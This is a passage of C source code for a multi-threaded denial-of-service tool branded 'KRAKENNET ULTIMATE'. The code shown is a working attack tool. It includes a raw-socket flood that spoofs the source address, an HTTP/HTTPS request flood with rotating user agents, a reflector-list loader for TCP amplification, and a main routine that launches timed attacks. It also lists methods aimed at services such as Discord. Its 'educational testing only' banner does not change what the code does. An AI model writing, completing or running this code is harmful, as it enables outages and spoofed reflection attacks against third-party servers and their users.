        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
        tcph->check = checksum_tcp_packet((unsigned short*)pseudogram, psize);
        free(pseudogram);
        
        int one = 1;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            printf("Setsockopt failed: %s\n", strerror(errno));
            close(s);
            return NULL;
        }
        
        int send_result = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        if(send_result > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, iph->tot_len);
        } else if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
            break;
        }
        
        usleep(1000);
    }
    
    close(s);
    printf("Thread exiting\n");
    return NULL;
}

// =============================================
// EMPTY-IP METHOD
// =============================================
void* empty_ip_flood_worker(void* arg) {
    char *target = (char*)arg;
    char packet[20];
    struct iphdr *iph = (struct iphdr *)packet;
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        printf("Socket creation failed (root required?): %s\n", strerror(errno));
        return NULL;
    }
    
    // Set socket to non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("Setsockopt failed: %s\n", strerror(errno));
        close(s);
        return NULL;
    }
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    if (sin.sin_addr.s_addr == INADDR_NONE) {
        printf("Error: Invalid target address\n");
        close(s);
        return NULL;
    }
    
    memset(packet, 0, sizeof(packet));
    
    // IP header setup
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 0;  // Protocol 0
    iph->saddr = inet_addr("8.8.8.8");
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)packet, sizeof(struct iphdr)/2);
    
    printf("Thread started for EMPTY-IP\n");
    
    while (running) {
        int send_result = sendto(s, packet, sizeof(struct iphdr), 0, (struct sockaddr *)&sin, sizeof(sin));
        if(send_result < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
                break;
            }
            usleep(1000);
            continue;
        }
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr));
        usleep(1000);
    }
    
    close(s);
    printf("Thread exiting\n");
    return NULL;
}

// =============================================
// HTTP/HTTPS BYPASS METHODS
// =============================================
struct string {
    char *ptr;
    size_t len;
};

void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(s->len + 1);
    if (s->ptr == NULL) {
        return;
    }
    s->ptr[0] = '\0';
}

size_t write_callback(void *ptr, size_t size, size_t nmemb, struct string *s) {
    size_t new_len = s->len + size * nmemb;
    s->ptr = realloc(s->ptr, new_len + 1);
    if (s->ptr == NULL) {
        return 0;
    }
    memcpy(s->ptr + s->len, ptr, size * nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;
    
    return size * nmemb;
}

void* http_flood_worker(void* arg) {
    char *host = (char*)arg;
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    
    if (!curl) {
        return NULL;
    }
    
    char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };
    int ua_count = 3;
    
    // Common paths to request
    char* paths[] = {
        "/", "/index.html", "/index.php", "/home", "/main", 
        "/test", "/api", "/static/style.css", "/images/logo.png",
        "/js/main.js", "/admin", "/login", "/contact", "/about"
    };
    int path_count = 14;
    
    printf("Thread started for HTTP-FLOOD\n");
    
    // Set common CURL options
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    
    struct string s;
    init_string(&s);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    
    while (running) {
        // Build URL
        char url[512];
        const char* protocol = (target_port == 443) ? "https" : "http";
        const char* path = paths[rand_cmwc() % path_count];
        
        if (target_port == 80 || target_port == 443) {
            snprintf(url, sizeof(url), "%s://%s%s", protocol, host, path);
        } else {
            snprintf(url, sizeof(url), "%s://%s:%d%s", protocol, host, target_port, path);
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[rand_cmwc() % ua_count]);
        
        // Reset the response buffer
        free(s.ptr);
        init_string(&s);
        
        // Perform the request
        res = curl_easy_perform(curl);
        
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        
        if (res == CURLE_OK && http_code > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, s.len);
        } else {
            __sync_fetch_and_add(&total_fail, 1);
        }

        usleep(50000);
    }
    
    free(s.ptr);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return NULL;
}

// =============================================
// Helper Functions
// =============================================
int load_reflector_list(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("Error: Could not open reflector file: %s\n", filename);
        return 0;
    }
    
    char line[256];
    int count = 0;
    
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n\r")] = 0;
        
        if (strlen(line) == 0) continue;
        
        char *ip = strtok(line, " ");
        char *port_str = strtok(NULL, " ");
        
        if (!ip || !port_str) continue;
        
        int port = atoi(port_str);
        if (port <= 0 || port > 65535) continue;
        
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        if (!new_node) continue;
        
        memset(new_node, 0, sizeof(struct list));
        new_node->data.sin_family = AF_INET;
        new_node->data.sin_addr.s_addr = inet_addr(ip);
        new_node->data.sin_port = htons(port);
        
        if (new_node->data.sin_addr.s_addr == INADDR_NONE) {
            free(new_node);
            continue;
        }
        
        if (!amp_head) {
            amp_head = new_node;
            new_node->next = new_node;
            new_node->prev = new_node;
        } else {
            new_node->prev = amp_head->prev;
            new_node->next = amp_head;
            amp_head->prev->next = new_node;
            amp_head->prev = new_node;
        }
        
        count++;
    }
    
    fclose(file);
    printf("Loaded %d reflectors from %s\n", count, filename);
    return count;
}

// =============================================
// MAIN FUNCTION
// =============================================
void print_banner() {
    printf("\n");
    printf("              ...-%@@@@@@@-..               \n");
    printf("             .:%@@@@@@@@@@@@%-.             \n");
    printf("            .#@@@@@@@@@@@@@@@@#.            \n");
    printf("           .%@@@@@@@@@@@@@@@@@@%.           \n");
    printf("           :@@@@@@@@@@@@@@@@@@@@:           \n");
    printf(" ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. \n");
    printf(":@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-\n");
    printf("_____________________________________\n");
    printf("|   KRAKENNET ULTIMATE v8.0         |\n");
    printf("|    EDUCATIONAL TESTING ONLY       |\n");
    printf("|     YOUR SERVERS ONLY!!!          |\n");
    printf("-------------------------------------\n\n");
}

void print_stats() {
    printf("\rPackets/Requests: %llu | Bytes: %llu | Failed: %llu", 
           total_success, total_bytes, total_fail);
    fflush(stdout);
}

void signal_handler(int sig) {
    running = 0;
    printf("\nShutting down...\n");
}

void print_methods() {
    printf("Available Methods:\n");
    printf("  nfo-tcp           - NFO TCP flood\n");
    printf("  sybex             - Sybex TCP RST flood\n");
    printf("  udp-flood         - UDP flood (connected sockets)\n");
    printf("  udp-bypass-raw    - UDP bypass (raw sockets)\n");
    printf("  vse               - VSE attack\n");
    printf("  discord           - Discord voice attack\n");
    printf("  empty-ip          - Empty IP protocol flood\n");
    printf("  http-flood        - HTTP/HTTPS flood\n");
    printf("  tcp-amp           - TCP amplification attack\n");
    printf("\nUsage: <target> <port> <method> <threads> <time> [reflector_file]\n");
    printf("Example: 192.168.1.1 80 udp-flood 100 60\n");
}

int main(int argc, char *argv[]) {
    print_banner();
    
    // Check for TCP-AMP which requires an additional argument
    int is_tcp_amp = 0;
    char reflector_file[256] = {0};
    
    if (argc >= 6 && strcmp(argv[3], "tcp-amp") == 0) {
        is_tcp_amp = 1;
        if (argc < 7) {
            printf("TCP-AMP requires a reflector file!\n");
            printf("Usage: %s <target> <port> tcp-amp <threads> <time> <reflector_file>\n", argv[0]);
            return 1;
        }
        strncpy(reflector_file, argv[6], sizeof(reflector_file) - 1);
    } else if (argc < 6) {
        printf("Invalid parameters!\n");
        print_methods();
        return 1;
    }
    
    // Check for root privileges
    if (geteuid() != 0) {
        printf("Warning: Root privileges recommended for raw socket operations\n");
    }
    
    signal(SIGINT, signal_handler);
    
    // Parse arguments
    strncpy(target_host, argv[1], sizeof(target_host) - 1);
    target_host[sizeof(target_host) - 1] = '\0';
    
    target_port = atoi(argv[2]);
    
    strncpy(attack_mode, argv[3], sizeof(attack_mode) - 1);
    attack_mode[sizeof(attack_mode) - 1] = '\0';
    
    num_workers = atoi(argv[4]);
    attack_duration = atoi(argv[5]);
    floodport = target_port;
    
    if (num_workers > MAX_THREADS) {
        num_workers = MAX_THREADS;
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
    }
    
    if (num_workers <= 0) {
        printf("Error: Invalid number of threads\n");
        return 1;
    }
    
    if (attack_duration <= 0) {
        printf("Error: Invalid duration\n");
        return 1;
    }
    
    // Initialize random
    init_rand(time(NULL));
    srand(time(NULL));
    
    printf("Target: %s:%d\n", target_host, target_port);
    printf("Method: %s\n", attack_mode);
    printf("Threads: %d\n", num_workers);
    printf("Duration: %d seconds\n", attack_duration);
    
    // For TCP-AMP, load reflector list
    if (is_tcp_amp) {
        printf("Reflector file: %s\n", reflector_file);
        int reflector_count = load_reflector_list(reflector_file);
        if (reflector_count == 0) {
            printf("Error: No valid reflectors loaded. Cannot continue.\n");
            return 1;
        }
    } else {
        // Resolve target for other methods
        struct hostent *he = gethostbyname(target_host);
        char target_ip[INET_ADDRSTRLEN];
        if (he) {
            inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
            printf("Resolved: %s -> %s\n", target_host, target_ip);
            strncpy(target_host, target_ip, sizeof(target_host) - 1);
        } else {
            printf("Using target as IP: %s\n", target_host);
        }
    }
    
    // Select worker function
    void *(*worker_func)(void*) = NULL;
    
    if (strcmp(attack_mode, "nfo-tcp") == 0) {
        worker_func = nfo_tcp_worker;
        printf("Starting NFO-TCP flood...\n");
    } else if (strcmp(attack_mode, "sybex") == 0) {
        worker_func = sybex_worker;
        printf("Starting Sybex RST flood...\n");
    } else if (strcmp(attack_mode, "udp-flood") == 0) {
        worker_func = udp_flood_worker;
        printf("Starting UDP flood...\n");
    } else if (strcmp(attack_mode, "udp-bypass-raw") == 0) {
        worker_func = udp_bypass_raw_worker;
        printf("Starting UDP bypass (raw)...\n");
    } else if (strcmp(attack_mode, "vse") == 0) {
        worker_func = vse_attack_worker;
        printf("Starting VSE attack...\n");
    } else if (strcmp(attack_mode, "discord") == 0) {
        worker_func = discord_attack_worker;
        printf("Starting Discord attack...\n");
    } else if (strcmp(attack_mode, "empty-ip") == 0) {
        worker_func = empty_ip_flood_worker;
        printf("Starting Empty IP flood...\n");
    } else if (strcmp(attack_mode, "http-flood") == 0) {
        worker_func = http_flood_worker;
        printf("Starting HTTP/HTTPS flood...\n");
    } else if (strcmp(attack_mode, "tcp-amp") == 0) {
        printf("Starting TCP amplification attack...\n");
    } else {
        printf("Unknown method: %s\n", attack_mode);
        print_methods();
        return 1;
    }
    
    printf("Starting in 3 seconds...\n");
    sleep(3);
    
    pthread_t threads[MAX_THREADS];
    int threads_created = 0;
    
    // Start workers
    if (strcmp(attack_mode, "tcp-amp") == 0) {
        // Special handling for TCP-AMP
        printf("Starting %d TCP-AMP workers...\n", num_workers);
        
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(target_port);
        sin.sin_addr.s_addr = inet_addr(target_host);
        
        if (sin.sin_addr.s_addr == INADDR_NONE) {
            printf("Error: Invalid target address for TCP-AMP\n");
            return 1;
        }
        
        struct thread_amp_data td[MAX_THREADS];
        struct list *current_node = amp_head;
        
        for (int i = 0; i < num_workers && current_node; i++) {
            td[i].thread_id = i;
            td[i].sin = sin;
            td[i].list_node = current_node;
            
            if (pthread_create(&threads[i], NULL, &tcp_amp_worker, (void *)&td[i]) != 0) {
                perror("Failed to create TCP-AMP thread");
                running = 0;
                break;
            }
            threads_created++;
            
            current_node = current_node->next;
            if (!current_node) current_node = amp_head;
        }
    } else {
        // Normal thread creation for other methods
        printf("Starting %d workers...\n", num_workers);
        for (int i = 0; i < num_workers; i++) {
            if (pthread_create(&threads[i], NULL, worker_func, (void*)target_host) != 0) {
                perror("Failed to create thread");
                running = 0;
                break;
            }
            threads_created++;
            usleep(10000);
        }
    }
    
    if (threads_created == 0) {
        printf("Error: No threads were created\n");
        return 1;
    }
    
    printf("Attack started! Press Ctrl+C to stop.\n");
    
    // Run for specified duration
    time_t start_time = time(NULL);
    while (running) {
        time_t current_time = time(NULL);
        if ((current_time - start_time) >= attack_duration) {
            running = 0;
            break;
        }
        print_stats();
        sleep(1);
    }
    
    // Wait for threads to finish
    printf("\nWaiting for threads to finish...\n");
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Cleanup
    if (strcmp(attack_mode, "http-flood") == 0) {
        curl_global_cleanup();
    }
    
    if (is_tcp_amp && amp_head) {
        struct list *current = amp_head;
        struct list *next;
        do {
            next = current->next;
            free(current);
            current = next;
        } while (current != amp_head);
    }
    
    printf("\nAttack complete!\n");
    printf("Total packets/requests: %llu\n", total_success);
    printf("Total bytes sent: %llu\n", total_bytes);
    if (total_fail > 0) {
        printf("Failed requests: %llu\n", total_fail);
    }
    
    return 0;
}
